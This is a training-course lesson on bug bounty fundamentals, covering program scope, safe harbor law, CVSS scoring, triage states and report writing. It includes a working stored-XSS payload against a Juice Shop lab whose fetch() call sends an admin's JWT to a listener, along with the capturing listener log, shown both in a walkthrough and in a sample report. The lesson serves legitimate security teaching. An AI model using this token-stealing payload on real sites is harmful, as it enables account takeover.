@@ -1,0 +1,163 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 4
+title: "Bug Bounty Fundamentals & Responsible Disclosure"
+order: 1
+estimatedHours: 12
+slug: bug-bounty-fundamentals-and-responsible-disclosure
+---
+
+## From Lab Work to Authorized Testing
+
+In Tier 0 you read a program's scope page for the first time and learned to check a domain against a list before touching it. That habit is about to carry real financial and legal weight. Everything you do in this module still happens against the same four categories of target this entire track uses: your own isolated lab (AD home lab, Metasploitable2, Juice Shop, DVWA), Offensive Security's Proving Grounds Practice, named legal wargames (flaws.cloud, flAWS 2), PortSwigger's own hosted Web Security Academy labs, and — only if you later hold a live engagement — a real program's own explicitly in-scope assets under its own safe-harbor terms. Nothing here is written against a hypothetical company or an unnamed "target." Bug bounty work does not start with a clever exploit. It starts with reading a legal document carefully enough to know what you are and are not allowed to break.
+
+## Reading a Real Scope Page
+
+Pull up `hackerone.com/deptofdefense` — the U.S. Department of Defense's Vulnerability Disclosure Program (DoD VDP), running continuously since the 2016 "Hack the Pentagon" pilot. It is a VDP, not a paid bounty, which matters: VDPs grant legal authorization to test but no money; bounty programs grant both. Read it the way you'd read a contract, because it is one.
+
+The policy's scope section does not say "test dod.mil." It enumerates: publicly accessible DoD websites, web applications, and APIs reachable on `.mil` and DoD-operated domains that fall under the program's general grant. It then explicitly excludes: contractor-owned, contractor-operated (COCO) systems not separately authorized, any system requiring classified access or PKI/CAC credentials you don't already hold, and systems any individual DoD component has pulled out of scope on the program's own asset list. The exclusions matter more than the inclusions — a `.mil` subdomain existing is not the same as a `.mil` subdomain being in scope.
+
+The out-of-scope techniques section is just as binding as the asset list: no denial-of-service testing, no physical access attempts, no social engineering or phishing of DoD personnel, and no extraction of more data than the minimum needed to prove the vulnerability exists. Violating a technique restriction on an in-scope asset still takes you outside the program's authorization — scope is two-dimensional (what you touch, and how you touch it), and both axes have to hold.
+
+Now compare a commercial program's structure. Shopify's long-running HackerOne program scopes `*.shopify.com`, `*.myshopify.com`, and its first-party mobile apps, but explicitly carves out third-party apps listed in the Shopify App Store (report those to the app's own developer, not Shopify) and individual merchant storefronts unless the issue is a platform-level flaw reproducible across any store. That carve-out exists because Shopify doesn't own the data or the risk decision for every merchant's shop — read it closely or you'll report something real that still gets closed as out-of-scope.
+
+Bugcrowd structures the same idea differently. Atlassian's public Bugcrowd program scopes its cloud products (Jira, Confluence, Trello, Bitbucket Cloud) and `*.atlassian.com`, while excluding self-hosted Server/Data Center instances past end-of-life and third-party Marketplace apps not published by Atlassian itself. Bugcrowd also rates severity with its own Vulnerability Rating Taxonomy (VRT) rather than raw CVSS by default — functionally similar, but if you only know CVSS vocabulary, read the VRT page before you argue severity with a Bugcrowd triager; you'll be speaking past each other otherwise.
+
+The practical rule, every time: open the live policy page immediately before testing, not from memory of a past read. Scope changes — assets get added, removed, or reclassified — and a program is only obligated to honor safe harbor for testing that matched the policy *as published at the time you tested it*.
+
+## What "Safe Harbor" Actually Buys You
+
+"Safe harbor" is not a vibe, it's a specific legal mechanism, and understanding it is what separates bug bounty hunting from grey-hat testing with extra paperwork.
+
+The U.S. Computer Fraud and Abuse Act (CFAA, 18 U.S.C. § 1030) criminalizes accessing a computer "without authorization or exceeding authorized access." The entire offense turns on that one word: authorization. A program's safe-harbor clause is the program owner, who actually has the authority to grant access to their own systems, stating in writing and in advance that good-faith testing within the documented scope *is* authorized. That single sentence is what converts your port scan and your XSS payload from "unauthorized access" into "testing the owner asked for." It's the same legal gap the Supreme Court sharpened in *Van Buren v. United States* (2021), which narrowed "exceeds authorized access" to gate-based access restrictions — meaning explicit, documented scope boundaries like a bounty program's policy page carry real legal weight, not just internal company opinion.
+
+This is also why the U.S. Department of Justice's 2022 charging policy update matters: DOJ formally stated it would decline to bring CFAA charges against good-faith security research conducted in a way "designed to test, investigate, or correct a security flaw." A program's safe-harbor statement is the documentary evidence that your specific activity fits that description.
+
+HackerOne publishes a template for this called the Gold Standard Safe Harbor (GSSH) statement, and most mature programs on the platform adopt language modeled on it: the program commits not to initiate legal action against a researcher who (a) acts in good faith, (b) stays inside the documented scope and technique restrictions, (c) avoids privacy violations, data destruction, and service disruption, and (d) gives the program reasonable time to remediate before any public disclosure. In exchange, the program treats that conduct as authorized under the CFAA, applicable state computer-crime statutes, and — separately — states it will not bring a DMCA Section 1201 anti-circumvention claim against you for bypassing a technical protection measure as part of that authorized testing.
+
+What safe harbor does *not* do: it does not cover anything outside the written scope, it does not cover prohibited techniques even on an in-scope asset, and it is not a license to disclose publicly on your own timeline — most policies require coordinated disclosure, meaning the program approves what gets published and when. Test one host not on the list, and you've stepped outside every one of those protections, even if your intentions were identical to the authorized work you did five minutes earlier on the host next to it.
+
+## Triage: How a Report Gets a Severity
+
+Once submitted, a report enters a triage queue. A human (or, increasingly, a first-pass automated classifier) checks four things in order: is it a real, reproducible bug; is it in scope; is it a duplicate; and what's its severity. Severity on most HackerOne programs is expressed as CVSS; let's score one for real.
+
+**Finding:** In your Juice Shop lab, the "Five-Star Feedback" challenge chain. Juice Shop's `/api/Feedback` endpoint accepts anonymous, unauthenticated feedback submissions, and the feedback display component renders the `comment` field using Angular's `DomSanitizer.bypassSecurityTrustHtml()` — a deliberate, real pattern in Juice Shop's source that disables Angular's default output encoding for that field. When an admin opens the backoffice feedback dashboard, any stored payload executes in the admin's authenticated session.
+
+Submit the payload:
+
+```bash
+curl -s https://localhost:3000/api/Feedback \
+  -H "Content-Type: application/json" \
+  -d '{"comment":"<img src=x onerror=\"fetch(`http://127.0.0.1:8888/c?t=`+localStorage.getItem(`token`))\">","rating":5}'
+```
+
+On your own attacking host (same host-only lab network), catch the exfil:
+
+```bash
+python3 -m http.server 8888
+# 127.0.0.1 - - [03/Oct/2026 14:02:11] "GET /c?t=eyJhbGciOiJIUzI1NiIs... HTTP/1.1" 200 -
+```
+
+The admin's JWT (Juice Shop stores its auth token in `localStorage`, not an httpOnly cookie, which is why `localStorage.getItem('token')` works directly from injected JS) lands in your listener log. That token is then replayable against any authenticated API endpoint — full admin account takeover.
+
+Now score it in CVSS 3.1:
+
+| Metric | Value | Reasoning |
+|---|---|---|
+| Attack Vector | Network (N) | Exploited over HTTP, no local access needed |
+| Attack Complexity | Low (L) | No race condition, no special config required |
+| Privileges Required | None (N) | Feedback submission requires no auth |
+| User Interaction | Required (R) | Admin must open the feedback dashboard |
+| Scope | Changed (C) | Vulnerable component (feedback API) ≠ impacted component (admin session) |
+| Confidentiality | High (H) | Full admin token, full data access |
+| Integrity | Low (L) | Token reuse enables some data modification, not total control of integrity |
+| Availability | None (N) | No availability impact |
+
+Vector string: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
+
+Working the official FIRST.org formula: Exploitability = 8.22 × 0.85 × 0.77 × 0.85 × 0.62 ≈ 2.84. Impact (scope-changed formula) ≈ 4.72. Base score = roundup(min[1.08 × (2.84 + 4.72), 10]) = **8.2 (High)**. Always re-verify your hand math against the live calculator at first.org/cvss/calculator before it goes in a report — triagers will.
+
+## Report States and Talking to a Triager
+
+A submitted report moves through a small, predictable set of states, and knowing them keeps you from panicking or giving up too early.
+
+- **New** — sitting in the queue, unread by a human.
+- **Triaged** — a triager reproduced it and assigned severity. On HackerOne this is the state that typically unlocks payment eligibility once severity is confirmed; on Bugcrowd the equivalent is often called "Unresolved" with a VRT priority assigned.
+- **Needs More Info** — the triager couldn't reproduce it as written. This is not a rejection. Respond with exactly what's missing: a fresh request/response capture, a screen recording, the precise account state required. Silence for the program's stated response window (often 14–30 days) can get a report auto-closed, so answer promptly even if the answer is "here is the missing step."
+- **Resolved / Fixed** — the fix shipped. Some programs then invite you to verify the patch; do that verification pass carefully, because a shallow re-test that misses a bypass costs you credibility on your next report to that program.
+- **N/A — Informative** — real bug, but below the bar the program pays for (e.g., missing a security header with no demonstrated exploit chain), or outside the program's accepted impact model. Read the triager's reasoning; arguing severity without new evidence rarely moves it, but a concrete new exploit chain sometimes does.
+- **N/A — Duplicate** — covered below. Ask for the duplicate's report number if it's not disclosed; most programs will confirm the number even without sharing full content, which lets you verify the overlap yourself instead of taking it on faith.
+
+One more mechanic tied directly to safe harbor: coordinated disclosure. Nearly every program's policy sets a window — commonly 90 days from fix, sometimes tied to "resolution" rather than a fixed date — before a researcher may publish anything publicly (a blog post, a conference talk, a tweet with technical detail). Publishing early isn't just bad etiquette; it can void the safe-harbor protection for that specific report, since the protection is conditioned on following the whole policy, not just the testing-technique half of it.
+
+## Checking for Duplicates Before You Submit
+
+Most programs pay only the first qualifying report of a given root cause. A near-identical finding submitted an hour later is almost always closed as "N/A — Duplicate" with zero payout, no matter how good the write-up is. Checking first is not optional diligence, it's the difference between getting paid and not.
+
+Worked example, using the DoD program's genuinely public Hacktivity (`hackerone.com/deptofdefense/hacktivity` — one of the largest public disclosure archives on the platform, useful for practicing this skill even outside a live engagement):
+
+1. Filter Hacktivity by **Vulnerability Type: Cross-Site Scripting**, sorted by most recent disclosure.
+2. Don't search the bug class ("XSS") — search the *sink* and the *parameter*. If your finding is a reflected XSS in a `redirect` query parameter, search `redirect` and `open redirect xss`, not just `xss`.
+3. Read the five to ten closest matches in full, not just the title. Compare root cause (same sink, same missing-encoding pattern), not surface symptom (same payload text means nothing — two different bugs can share a payload).
+4. If a disclosed report matches your root cause on a *different* host or parameter, it is not automatically a duplicate — programs scope duplicates per-asset, not per-bug-class — but you must say so explicitly in your own submission ("Note: this is the same sink pattern as #XXXXXX on `host-a`, but reproduces independently on `host-b` with no shared fix"). That line alone resolves most "is this really new" triager hesitation before it starts.
+5. If your root cause exactly matches a disclosed report on the *same* asset, do not submit — you will lose the time, and a thin duplicate queue is part of what keeps a program's triage fast for everyone.
+
+## Writing the Report
+
+A report earns a fast "Triaged" status by doing the triager's verification work for them. Below is a complete report in HackerOne's report format for the Five-Star Feedback stored-XSS chain above. Juice Shop isn't a paid program — there's no live "Target" to point at — so use this purely to drill the *format and prose*. On a real engagement, the Asset field names the exact in-scope host from that program's policy page, and your PoC stays inside whatever interaction limits its safe harbor allows.
+
+```markdown
+# Title
+Stored XSS in Feedback Submission Leads to Admin Session Takeover (Five-Star Feedback)
+
+## Summary
+The /api/Feedback endpoint accepts unauthenticated, unsanitized HTML in the
+`comment` field. The admin backoffice feedback view renders this field via
+Angular's bypassSecurityTrustHtml(), disabling output encoding. A crafted
+payload executes in the admin's browser when they review feedback, allowing
+theft of the admin's JWT from localStorage and full account takeover.
+
+## Vulnerability Type
+Cross-Site Scripting (Stored) — CWE-79
+
+## Severity
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N — 8.2 (High)
+
+## Steps to Reproduce
+1. Submit feedback with no authentication:
+   curl -s https://localhost:3000/api/Feedback -H "Content-Type: application/json" \
+     -d '{"comment":"<img src=x onerror=\"fetch(`http://127.0.0.1:8888/c?t=`+localStorage.getItem(`token`))\">","rating":5}'
+2. Confirm 201 Created in the response.
+3. Authenticate as admin (admin@juice-sh.op) and open /#/administration
+   to view the feedback dashboard, where feedback is listed.
+4. On the attacking host, observe the GET request to the local listener
+   carrying the admin's JWT:
+   python3 -m http.server 8888
+5. Replay the captured token as a Bearer token against GET /api/Users
+   to confirm full admin API access.
+
+## Impact
+Full administrative account takeover via token theft, with no admin
+interaction beyond opening the standard moderation view. Any admin who
+reviews feedback is compromised; the payload persists until the backing
+feedback record is deleted.
+
+## Remediation
+Remove the bypassSecurityTrustHtml() call for user-supplied comment text;
+render it as text content (Angular's default interpolation) or sanitize
+server-side with an allowlist-based HTML sanitizer before storage.
+
+## Supporting Material
+- PoC request/response log (attached)
+- Listener capture showing exfiltrated token (attached)
+```
+
+Notice what's absent: no hedging ("this might be exploitable"), no narrative of your whole session, no payload dumped without context. Every section answers one triager question — what is it, how bad is it, how do I reproduce it myself, how do I fix it — in the order they'll actually read it.
+
+## Exercise
+
+Pick an XSS or injection finding from your DVWA or Juice Shop lab that you solved in an earlier tier but never wrote up formally. Produce a complete report in the format above: title, CWE, a CVSS 3.1 vector you derive and justify metric-by-metric (not copied from this lesson), numbered reproduction steps with real request/response data, impact, and remediation.
+
+Then run the duplicate-check drill for real: pick the vulnerability class from your finding (XSS, SQLi, IDOR, whichever), go to `hackerone.com/deptofdefense/hacktivity` or GitLab's public HackerOne Hacktivity, filter to that type, and find two disclosed reports that share your finding's root cause. Write two sentences on what specifically would distinguish your finding from theirs if it were submitted to a real program.
+
+Hint: triagers close far more reports as "insufficient reproduction detail" than as "not a vulnerability." If a stranger couldn't follow your Steps to Reproduce with zero prior context and zero access to your terminal history, the report isn't done yet — the CVSS score is the easy part.
